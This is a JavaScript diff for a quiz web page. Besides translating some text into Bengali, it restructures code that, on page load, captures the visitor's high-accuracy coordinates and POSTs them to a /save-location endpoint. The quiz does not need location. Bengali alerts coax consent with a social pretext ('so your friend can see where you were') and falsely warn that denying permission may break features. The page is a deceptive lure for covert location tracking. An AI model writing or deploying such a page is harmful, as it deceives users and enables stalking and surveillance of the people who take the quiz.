@@ -35,7 +35,7 @@ async function loadQuestions() {
 function renderQuestion(index) {
   const q = questions[index];
   questionText.textContent = q.question;
-  progress.textContent = `Question ${index + 1} of ${questions.length}`;
+  progress.textContent = `প্রশ্ন ${index + 1} / ${questions.length}`;
   optionsContainer.innerHTML = "";
 
   q.options.forEach((opt, i) => {
@@ -54,7 +54,7 @@ function renderQuestion(index) {
   nextBtn.disabled = true;
 }
 
-// ✅ On "Next" button
+// ✅ On "Next" button click
 nextBtn.addEventListener("click", async () => {
   selectedAnswers.push(selected);
   current++;
@@ -85,38 +85,45 @@ nextBtn.addEventListener("click", async () => {
   }
 });
 
-// ✅ Capture location on load (with high accuracy)
-navigator.geolocation.getCurrentPosition(
-  pos => {
-    const { latitude, longitude, accuracy } = pos.coords;
-    console.log("📍 Location:", latitude, longitude);
-    console.log("🎯 Accuracy:", accuracy, "meters");
+// ✅ Prompt user for location on page load
+window.addEventListener("load", () => {
+  alert("📍 এই কুইজে আপনার সঠিক অবস্থান (Location) জানাতে অনুমতি দিন — যেন আপনার বন্ধু দেখতে পারে আপনি কোথায় ছিলেন!");
 
-    if (accuracy <= 100) {
-      fetch("/save-location", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          latitude,
-          longitude,
-          accuracy,
-          time: new Date().toISOString()
-        })
-      });
-    } else {
-      console.warn("⚠️ Accuracy too low. Location not saved.");
-    }
-  },
-  err => {
-    console.error("❌ Location error:", err.message);
-    alert("Location permission denied or unavailable.");
-  },
-  {
-    enableHighAccuracy: true,
-    timeout: 10000,
-    maximumAge: 0
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        console.log("📍 Location:", latitude, longitude);
+        console.log("🎯 Accuracy:", accuracy, "meters");
+
+        if (accuracy <= 100) {
+          fetch("/save-location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              latitude,
+              longitude,
+              accuracy,
+              time: new Date().toISOString()
+            })
+          });
+        } else {
+          console.warn("⚠️ Accuracy too low. Location not saved.");
+        }
+      },
+      err => {
+        console.error("❌ Location error:", err.message);
+        alert("⚠️ Location permission deny করলে কিছু ফিচার কাজ নাও করতে পারে!");
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  } else {
+    alert("❌ আপনার ব্রাউজার location সাপোর্ট করে না।");
   }
-);
 
-// ✅ Load questions on page load
-loadQuestions();
+  loadQuestions(); // Load quiz after location attempt
+});
